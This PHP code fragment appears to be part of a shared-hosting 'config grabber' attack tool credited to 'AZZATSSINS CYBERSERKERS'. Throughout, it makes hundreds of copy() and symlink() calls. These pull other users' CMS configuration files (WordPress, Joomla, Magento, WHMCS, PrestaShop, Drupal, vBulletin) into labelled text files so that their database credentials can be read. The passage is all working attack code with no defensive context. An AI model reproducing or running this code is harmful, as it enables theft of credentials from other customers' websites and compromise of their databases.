copy('/'.$home.'/'.$user.'/www/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/application/config/database.php',$user.' <~ ELLISLAB.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/admin/config.php',$user.' <~ OPENCART.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/sites/default/settings.php',$user.' <~ DRUPAL.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/forum/config.php',$user.' <~ PHPBB.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/config.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/html/config.php',$user.' <~ PHPNUKE.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/conn.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/application/config/database.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/application/config/database.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/wp-configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
copy('/var/www/vhosts/'.$user.'/httpdocs/site/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/news/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/home/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/press/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/new/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/blog/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/submitticket.php',$user.' <~ WHMCS.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/cms/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/beta/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/portal/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/site/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/main/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/home/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/demo/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/test/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/v1/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/v2/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/joomla/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/new/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/app/etc/local.xml',$user.' <~ MAGENTO.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/application/config/database.php',$user.' <~ ELLISLAB.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/admin/config.php',$user.' <~ OPENCART.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/sites/default/settings.php',$user.' <~ DRUPAL.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/forum/config.php',$user.' <~ PHPBB.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/config.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/html/config.php',$user.' <~ PHPNUKE.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/conn.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/httpdocs/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/wp-configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
symlink('/var/www/vhosts/'.$user.'/httpdocs/site/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/news/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/home/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/press/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/new/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/blog/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/submitticket.php',$user.' <~ WHMCS.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/cms/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/beta/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/portal/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/site/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/main/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/home/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/demo/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/test/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/v1/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/v2/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/joomla/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/new/configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/app/etc/local.xml',$user.' <~ MAGENTO.txt');
symlink('/var/www/vhosts/'.$user.'/httpdocs/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
copy('/var/www/vhosts/'.$user.'/html/application/config/database.php',$user.' <~ ELLISLAB.txt');
copy('/var/www/vhosts/'.$user.'/html/admin/config.php',$user.' <~ OPENCART.txt');
copy('/var/www/vhosts/'.$user.'/html/sites/default/settings.php',$user.' <~ DRUPAL.txt');
copy('/var/www/vhosts/'.$user.'/html/forum/config.php',$user.' <~ PHPBB.txt');
copy('/var/www/vhosts/'.$user.'/html/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/vhosts/'.$user.'/html/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/vhosts/'.$user.'/html/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/vhosts/'.$user.'/html/config.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/html/html/config.php',$user.' <~ PHPNUKE.txt');
copy('/var/www/vhosts/'.$user.'/html/conn.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/html/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/html/application/config/database.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/html/application/config/database.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/html/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/wp-configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
copy('/var/www/vhosts/'.$user.'/html/site/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/news/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/home/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/press/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/new/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/html/blog/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/submitticket.php',$user.' <~ WHMCS.txt');
copy('/var/www/vhosts/'.$user.'/html/cms/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/beta/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/portal/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/site/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/main/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/home/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/demo/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/test/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/v1/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/v2/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/joomla/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/new/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/html/app/etc/local.xml',$user.' <~ MAGENTO.txt');
copy('/var/www/vhosts/'.$user.'/html/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
copy('/var/www/vhosts/'.$user.'/application/config/database.php',$user.' <~ ELLISLAB.txt');
copy('/var/www/vhosts/'.$user.'/admin/config.php',$user.' <~ OPENCART.txt');
copy('/var/www/vhosts/'.$user.'/sites/default/settings.php',$user.' <~ DRUPAL.txt');
copy('/var/www/vhosts/'.$user.'/forum/config.php',$user.' <~ PHPBB.txt');
copy('/var/www/vhosts/'.$user.'/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/vhosts/'.$user.'/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/vhosts/'.$user.'/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/vhosts/'.$user.'/config.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/html/config.php',$user.' <~ PHPNUKE.txt');
copy('/var/www/vhosts/'.$user.'/conn.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/application/config/database.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/application/config/database.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/wp-configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
copy('/var/www/vhosts/'.$user.'/site/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/news/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/home/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/press/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/new/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/vhosts/'.$user.'/blog/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/submitticket.php',$user.' <~ WHMCS.txt');
copy('/var/www/vhosts/'.$user.'/cms/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/beta/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/portal/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/site/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/main/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/home/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/demo/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/test/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/v1/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/v2/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/joomla/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/new/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/vhosts/'.$user.'/app/etc/local.xml',$user.' <~ MAGENTO.txt');
copy('/var/www/vhosts/'.$user.'/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
copy('/var/www/'.$user.'/html/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
copy('/var/www/'.$user.'/application/config/database.php',$user.' <~ ELLISLAB.txt');
copy('/var/www/'.$user.'/admin/config.php',$user.' <~ OPENCART.txt');
copy('/var/www/'.$user.'/sites/default/settings.php',$user.' <~ DRUPAL.txt');
copy('/var/www/'.$user.'/forum/config.php',$user.' <~ PHPBB.txt');
copy('/var/www/'.$user.'/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/'.$user.'/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/'.$user.'/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/'.$user.'/config.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/html/config.php',$user.' <~ PHPNUKE.txt');
copy('/var/www/'.$user.'/conn.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/application/config/database.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/application/config/database.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/wp-configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
copy('/var/www/'.$user.'/site/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/news/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/home/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/press/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/new/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/blog/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/submitticket.php',$user.' <~ WHMCS.txt');
copy('/var/www/'.$user.'/cms/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/beta/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/portal/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/site/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/main/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/home/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/demo/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/test/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/v1/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/v2/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/joomla/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/new/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/app/etc/local.xml',$user.' <~ MAGENTO.txt');
copy('/var/www/'.$user.'/html/html/config/settings.inc.php',$user.' <~ PRESTASHOP.txt');
copy('/var/www/'.$user.'/html/application/config/database.php',$user.' <~ ELLISLAB.txt');
copy('/var/www/'.$user.'/html/admin/config.php',$user.' <~ OPENCART.txt');
copy('/var/www/'.$user.'/html/sites/default/settings.php',$user.' <~ DRUPAL.txt');
copy('/var/www/'.$user.'/html/forum/config.php',$user.' <~ PHPBB.txt');
copy('/var/www/'.$user.'/html/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/'.$user.'/html/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/'.$user.'/html/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
copy('/var/www/'.$user.'/html/config.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/html/html/config.php',$user.' <~ PHPNUKE.txt');
copy('/var/www/'.$user.'/html/conn.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/html/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/html/application/config/database.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/html/application/config/database.php',$user.' <~ OTHER.txt');
copy('/var/www/'.$user.'/html/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/wp-configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/beta/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/portal/wp-config.php',$user.' <~ WORDPRESS.txt');
/* AUTHOR : AZZATSSINS CYBERSERKERS */
copy('/var/www/'.$user.'/html/site/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/wp/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/WP/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/news/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/wordpress/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/test/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/demo/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/home/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/v1/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/v2/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/press/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/new/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/blogs/wp-config.php',$user.' <~ WORDPRESS.txt');
copy('/var/www/'.$user.'/html/blog/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/submitticket.php',$user.' <~ WHMCS.txt');
copy('/var/www/'.$user.'/html/cms/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/beta/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/portal/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/site/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/main/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/home/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/demo/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/test/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/v1/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/v2/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/joomla/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/new/configuration.php',$user.' <~ JOOMLA.txt');
copy('/var/www/'.$user.'/html/app/etc/local.xml',$user.' <~ MAGENTO.txt');
symlink('/var/www/vhosts/'.$user.'/html/application/config/database.php',$user.' <~ ELLISLAB.txt');
symlink('/var/www/vhosts/'.$user.'/html/admin/config.php',$user.' <~ OPENCART.txt');
symlink('/var/www/vhosts/'.$user.'/html/sites/default/settings.php',$user.' <~ DRUPAL.txt');
symlink('/var/www/vhosts/'.$user.'/html/forum/config.php',$user.' <~ PHPBB.txt');
symlink('/var/www/vhosts/'.$user.'/html/vb/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/vhosts/'.$user.'/html/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/vhosts/'.$user.'/html/forum/includes/config.php',$user.' <~ VBULLETIN.txt');
symlink('/var/www/vhosts/'.$user.'/html/config.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/html/html/config.php',$user.' <~ PHPNUKE.txt');
symlink('/var/www/vhosts/'.$user.'/html/conn.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/html/inc/config.inc.php',$user.' <~ OTHER.txt');
copy('/var/www/vhosts/'.$user.'/html/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/html/application/config/database.php',$user.' <~ OTHER.txt');
symlink('/var/www/vhosts/'.$user.'/html/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/wp-configuration.php',$user.' <~ JOOMLA.txt');
symlink('/var/www/vhosts/'.$user.'/html/wp/test/wp-config.php',$user.' <~ WORDPRESS.txt');
symlink('/var/www/vhosts/'.$user.'/html/blog/wp-config.php',$user.' <~ WORDPRESS.txt');
